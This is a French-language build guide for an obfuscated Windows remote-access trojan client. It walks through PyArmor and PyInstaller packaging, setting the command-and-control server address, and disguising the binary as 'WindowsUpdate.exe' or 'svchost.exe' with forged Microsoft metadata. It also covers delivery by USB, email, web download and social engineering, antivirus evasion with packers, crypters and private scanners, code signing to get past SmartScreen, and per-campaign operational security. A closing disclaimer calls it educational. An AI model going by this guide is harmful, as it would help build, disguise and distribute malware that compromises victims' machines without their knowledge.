# 🏗️ Guide de Build - Client RAT Obfusqué

## Vue d'ensemble

Ce guide explique comment créer un exécutable Windows obfusqué et autonome du client RAT en utilisant **PyArmor** pour l'obfuscation et **PyInstaller** pour la compilation.

## Protection PyArmor

PyArmor offre plusieurs niveaux de protection :

- ✅ **Obfuscation du bytecode** - Rend le code illisible
- ✅ **Protection runtime dynamique** - Chiffrement en mémoire
- ✅ **Anti-décompilation** - Empêche la reverse engineering
- ✅ **Restriction d'importation** - Empêche l'extraction des modules
- ✅ **Compilation JIT** - Performance optimisée

## Prérequis

### 1. Installer les dépendances de build

```bash
pip install pyarmor pyinstaller
```

### 2. Installer toutes les dépendances du client

```bash
pip install -r requirements.txt
```

## Configuration

### 1. Modifier config.py

Avant le build, assurez-vous que `config.py` contient les bonnes informations :

```python
# config.py
HOST = "http://VOTRE_SERVEUR:5000"  # ⚠️ À MODIFIER
ENCRYPTION_KEY = b"votre_cle_de_32_caracteres_ici"  # ⚠️ À MODIFIER
```

### 2. (Optionnel) Ajouter un icône

Pour personnaliser l'icône de l'exécutable :

1. Placez un fichier `icon.ico` dans le dossier du projet
2. Dans `build_client.py`, modifiez la ligne `icon=None` en `icon='icon.ico'`

## Build

### Méthode Automatique (Recommandée)

```bash
python build_client.py
```

Le script va :
1. ✅ Vérifier les dépendances
2. ✅ Nettoyer les anciens builds
3. ✅ Obfusquer le code avec PyArmor
4. ✅ Créer le fichier spec PyInstaller
5. ✅ Compiler l'exécutable
6. ✅ Générer `dist/WindowsUpdate.exe`

### Méthode Manuelle

#### Étape 1 : Obfusquer avec PyArmor

```bash
# Obfusquer le code
pyarmor gen --output obfuscated/dist --pack onefile --private --restrict --enable-jit client.py
```

#### Étape 2 : Compiler avec PyInstaller

```bash
# Compiler
pyinstaller --clean --noconfirm client.spec
```

## Résultat

Après le build, vous obtiendrez :

```
dist/
└── WindowsUpdate.exe    # ⭐ Exécutable final (~15-25 MB)

obfuscated/
└── dist/
    ├── client.py        # Code obfusqué
    └── pyarmor_runtime_*/  # Runtime PyArmor

build/
└── ...                  # Fichiers temporaires
```

## Test

### Test Local

```bash
# Tester l'exécutable
.\dist\WindowsUpdate.exe
```

### Test en VM

**Recommandé** : Testez toujours dans une machine virtuelle d'abord !

1. Créer une VM Windows propre
2. Copier `WindowsUpdate.exe` dans la VM
3. Exécuter et vérifier la connexion au serveur
4. Vérifier les logs serveur

## Déploiement

### Renommer l'exécutable (Optionnel)

Pour plus de discrétion :

```bash
# Renommer en quelque chose de légitime
move dist\WindowsUpdate.exe dist\svchost.exe
move dist\WindowsUpdate.exe dist\dwm.exe
move dist\WindowsUpdate.exe dist\RuntimeBroker.exe
```

### Méthodes de déploiement

1. **USB** : Copier directement sur une clé USB
2. **Email** : Compresser et envoyer (attention aux antivirus)
3. **Web** : Héberger et télécharger via navigateur
4. **Social Engineering** : Déguiser en logiciel légitime

## Contournement Antivirus

### Techniques de base

1. **Obfuscation supplémentaire**
   ```bash
   # Utiliser UPX pour compresser
   upx --best dist/WindowsUpdate.exe
   ```

2. **Modifier les signatures**
   - Changer les strings dans le code
   - Modifier les noms de fonctions
   - Ajouter du code inutile

3. **Chiffrer l'exécutable**
   ```bash
   # Utiliser un crypter tiers
   # (Non fourni - rechercher "PE crypter")
   ```

### Vérifier la détection

Avant déploiement, testez sur :

- VirusTotal (⚠️ rend le fichier public)
- Antiscan.me (privé)
- Hybrid Analysis

## Personnalisation Avancée

### 1. Changer les métadonnées

Créer `version_info.txt` :

```
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0),
    prodvers=(1, 0, 0, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo([
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft Corporation'),
        StringStruct(u'FileDescription', u'Windows Update Service'),
        StringStruct(u'FileVersion', u'10.0.19041.1'),
        StringStruct(u'InternalName', u'WindowsUpdate'),
        StringStruct(u'LegalCopyright', u'© Microsoft Corporation'),
        StringStruct(u'OriginalFilename', u'WindowsUpdate.exe'),
        StringStruct(u'ProductName', u'Microsoft Windows'),
        StringStruct(u'ProductVersion', u'10.0.19041.1')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
```

Puis compiler avec :

```bash
pyi-makespec --version-file=version_info.txt client.py
```

### 2. Signature de code

Pour contourner SmartScreen :

```bash
# Signer avec un certificat (nécessite un certificat valide)
signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com dist/WindowsUpdate.exe
```

## Sécurité du Build

### Protéger vos builds

1. **Ne jamais uploader sur VirusTotal** (signatures publiques)
2. **Chiffrer les backups** de vos builds
3. **Utiliser des clés uniques** par campagne
4. **Nettoyer les métadonnées** du build

### Nettoyage post-build

```bash
# Supprimer les fichiers intermédiaires
rm -rf build/
rm -rf obfuscated/
rm client.spec
```

## Dépannage

### Erreur : "PyArmor not found"

```bash
pip install --upgrade pyarmor
```

### Erreur : "PyInstaller failed"

```bash
pip install --upgrade pyinstaller
pip install --upgrade setuptools
```

### L'exe ne fonctionne pas

1. Vérifier les dépendances dans le spec
2. Tester en mode console (`console=True`)
3. Vérifier les logs d'erreur

### L'exe est trop gros

1. Retirer les dépendances inutilisées
2. Utiliser UPX pour compression
3. Exclure des modules non essentiels

## Maintenance

### Rebuild après modifications

Si vous modifiez le code :

```bash
# Nettoyer complètement
rm -rf dist/ build/ obfuscated/

# Rebuild
python build_client.py
```

### Versions multiples

Pour gérer plusieurs versions :

```bash
# Renommer avec version
mv dist/WindowsUpdate.exe dist/WindowsUpdate_v1.0.exe
```

## Sécurité Opérationnelle

### ⚠️ AVERTISSEMENTS

- Ne testez que sur vos propres machines ou avec autorisation
- Utilisez un VPN lors du développement
- Ne stockez pas les builds sur des services cloud publics
- Chiffrez vos disques de développement
- Utilisez des VM pour les tests

### Bonnes Pratiques

1. **Environnement isolé** : Développez dans une VM
2. **Communication chiffrée** : Utilisez toujours HTTPS/TLS
3. **Clés uniques** : Une clé par déploiement
4. **Logs sécurisés** : Chiffrez les logs
5. **Destruction sécurisée** : Effacez les builds obsolètes

## Support PyArmor

### Versions

- **PyArmor Basic** (gratuit) : Protection standard
- **PyArmor Pro** : Protection avancée + anti-debug

### Commandes utiles

```bash
# Vérifier la version
pyarmor --version

# Aide
pyarmor gen --help

# Lister les options de protection
pyarmor cfg
```

## Ressources

- [PyArmor Documentation](https://pyarmor.readthedocs.io/)
- [PyInstaller Manual](https://pyinstaller.org/)
- [Antivirus Evasion Techniques](https://github.com/topics/av-evasion)

## Checklist de Build

Avant chaque build :

- [ ] Config.py mis à jour (HOST, KEY)
- [ ] Code testé en local
- [ ] Dépendances installées
- [ ] Icône personnalisé (optionnel)
- [ ] Métadonnées configurées (optionnel)
- [ ] VM de test prête
- [ ] Serveur C2 opérationnel

Après le build :

- [ ] Taille de l'exe raisonnable (< 30 MB)
- [ ] Test en VM réussi
- [ ] Connexion serveur validée
- [ ] Fonctionnalités testées
- [ ] Détection AV vérifiée (privé)
- [ ] Build sauvegardé (chiffré)

---

**⚠️ DISCLAIMER** : Cet outil est à des fins éducatives uniquement. L'utilisation non autorisée sur des systèmes tiers est illégale.
